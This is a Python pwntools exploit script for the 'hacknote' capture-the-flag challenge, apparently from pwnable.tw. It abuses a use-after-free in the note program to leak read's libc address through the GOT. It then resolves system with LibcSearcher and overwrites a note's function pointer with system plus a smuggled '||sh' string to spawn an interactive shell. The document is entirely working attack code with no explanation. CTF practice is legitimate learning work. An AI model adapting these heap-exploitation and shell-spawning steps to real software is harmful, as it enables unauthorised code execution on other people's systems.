#!/usr/bin/env python
from pwn import *
from LibcSearcher import *

def add(size, content):
	print r.recvuntil("Your choice :")
	r.sendline('1')
	print r.recvuntil("Note size :")
	r.sendline(str(size))
	print r.recvuntil("Content :")
	r.send(content)

def delete(index):
	print r.recvuntil("Your choice :")
	r.sendline('2')
	print r.recvuntil("Index :")
	r.sendline(str(index))

def show(index):
	print r.recvuntil("Your choice :")
	r.sendline('3')
	print r.recvuntil("Index :")
	r.sendline(str(index))

#r = remote("111.198.29.45", 43097)
#r = remote("chall.pwnable.tw", 10102)
r = process('./hacknote')
elf = ELF('./hacknote')
libc = ELF('./libc_32.so.6')
my_puts = 0x0804862b
read_got = elf.got['read']

add(0x80, 'a\n')
add(0x80, 'b\n')
delete(0)
delete(1)
payload = p32(my_puts) + p32(read_got)
add(8, payload)
show(0)
read_addr = u32(r.recv(4))

'''
libc_base = read_addr - libc.symbols['read']
system = libc_base + libc.symbols['system']
'''

libc = LibcSearcher("read", read_addr)
libc_base = read_addr - libc.dump("read")
system = libc_base + libc.dump("system")


print "read:", hex(read_addr)
print "system:", hex(system)

delete(2)
payload = p32(system) + '||sh'
add(0x8, payload)
show(0)

r.interactive()
